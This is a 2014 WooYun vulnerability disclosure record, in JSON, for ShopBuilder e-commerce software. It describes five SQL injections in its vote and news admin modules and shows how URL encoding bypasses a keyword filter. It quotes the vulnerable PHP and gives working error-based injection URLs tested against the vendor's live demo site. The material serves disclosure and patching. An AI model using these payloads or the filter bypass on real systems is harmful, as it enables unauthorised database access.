{"id": 51953, "wybug_id": "wooyun-2014-072822", "wybug_title": "ShopBuilder网上商城 get型 sql注入打包 (1~5) 官网demo测试成功", "wybug_corp": "shop-builder.cn", "wybug_author": "roker", "wybug_date": "2014-09-29 18:48", "wybug_open_date": "2014-12-28 18:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向公众公开  简要描述： rt 详细说明：  首先get类型是有过滤的 \nif(inject_check($_SERVER[\"REQUEST_URI\"]))\t{\t\tdie('Invalid URL !');\t}function inject_check($sql){ \treturn preg_match(\"/(select|insert|delete|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|\\'|%27|{|\\()/i\", $sql);// 进行过滤   }\n不过这个过滤我们可以无视，url编码即可绕过#1 module\\vote\\admin\\vote.php(审核看清了哦 和这个不一样的 WooYun: ShopBuilder商城 v5.6.1 sql注入 #1 )49行\nif(!empty($_GET['vid'])){\t$sql=\"select * from \".NEWSVOTE.\" where id=$_GET[vid]\";\t\techo $sql;\t$db->query($sql);\t$re=$db->fetchRow();\t$vote=explode('|',$re['votetext']);\tfor($i=0;$i<count($vote);$i++)\t{\t\t$vote[$i]=explode(',',$vote[$i]);\t}}\nvid 没有过滤官网测试 http://www.a5shop.cn/?m=vote/admin&s=vote&vid=11%20and%201=updatexml%281,concat%280x5c,%28%73elect user%28%29%29%29,1%29\n\n#2module\\vote\\admin\\vote_list.php\nif(!empty($_GET['did'])){\t$id=$_GET['did'];}if(!empty($id)){\tif($submit==lang_show('del') or !empty($_GET['did']))\t{\t   $sql=\"delete from \".NEWSVOTE.\" where id in ($id)\";\t}\tif($submit==lang_show('bres'))\t  $sql=\"update \".NEWSVOTE.\" set type=1 where id in ($id)\";\tif($submit==lang_show('nbres'))\t  $sql=\"update \".NEWSVOTE.\" set type=0 where id in ($id)\";\t $db->query($sql);}\ndid没有过滤然后带入id进行了查询官网测试http://www.a5shop.cn/?m=vote/admin&s=vote_list&did=11%20and%201=updatexml%281,concat%280x5c,%28%73elect user%28%29%29%29,1%29#3 module\\news\\admin\\news.php92 行\nif($_POST['act']=='edit' and !empty($_GET['newsid']))\t{\t\t$sql=\"update \".NEWSD.\" set title='$_POST[title]',ftitle='$_POST[ftitle]',keyboard='$_POST[key]',titleurl='$_POST[links]', isrec='$_POST[rec]', istop='$_POST[istop]',ispass='$_POST[pass]',onclick='$_POST[onclick]',titlefont='$titlefont',uptime='$time',smalltext='$_POST[smalltext]',writer='$_POST[writer]',source='$_POST[source]',titlepic='$pname',ispic='$ispic',isgid='$_POST[group]',ispl='$_POST[closepl]',userfen='$_POST[userfen]',newstempid='$_POST[newstempid]',imgs_url='$imgs_url',videos_url='$video_url',vote='$vote',admin='$_POST[admin]',special='$special',lastedittime='\".time().\"' where nid= $_GET[newsid]\";\t\t$re=$db->query($sql);\t\t$sql=\"update \".NEWSDATA.\" set con='$_POST[body]' where nid= $_GET[newsid]\";\nnewsid没有过滤官网测试http://www.a5shop.cn/?m=news/admin&s=news&newsid=updatexml%281,concat%280x5c,%28%73elect user%28%29%29%29,1%29#4module\\news\\admin\\newslist.php开头处\nif(!empty($_GET['did'])){\t$id=$_GET['did'];}if(!empty($id)){\tif($submit==lang_show('del') or !empty($_GET['did']))\t{\t   $sql=\"delete from \".NEWSD.\" where nid in ($id)\";\t   $db->query($sql);\t   $sql=\"delete from \".NEWSDATA.\" where nid in ($id)\";\t}\n官网测试http://www.a5shop.cn/?m=news/admin&s=newslist&did=1%29%20and%201=updatexml%281,concat%280x5c,%28select%20user%28%29%29%29,1%29%23#5module\\news\\admin\\newslist.php37行\nif($submit==lang_show('copy') and !empty($_GET['nclass']))\t{ \t\tforeach($_GET['chk'] as $val)\t\t{\t\t\t$sql=\"INSERT \".NEWSD.\"(title,ftitle,keyboard,titleurl,isrec,istop,ispass,firsttitle,onclick,titlefont,uid,uptime,smalltext,writer,source,titlepic,ispic,isgid,ispl,userfen,newstempid,pagenum,imgs_url,videos_url,vote,special,classid,lastedittime) select title,ftitle,keyboard,titleurl,isrec,istop,ispass,firsttitle,onclick,titlefont,uid,uptime,smalltext,writer,source,titlepic,ispic,isgid,ispl,userfen,newstempid,pagenum,imgs_url,videos_url,vote,special,'$_GET[nclass]',lastedittime from \".NEWSD.\" where nid =$val\";\t\t\t$db->query($sql);\t\t\t$id=$db->lastid();\t\t\t$sql=\"INSERT INTO \".NEWSDATA.\" (con,nid) select con,$id from \".NEWSDATA.\" where nid =$val\";\t\t\t$re=$db->query($sql);\t\t}\t}\nnclass不为空且chk为数组时 带入了数据库官网测试http://www.a5shop.cn/?m=news/admin&s=newslist&nclass=1&chk[]=1%29 and 1=updatexml%281,concat%280x5c,%28%73elect user%28%29%29%29,1%29%23   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-09-30 09:15 厂商回复： 新版本已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}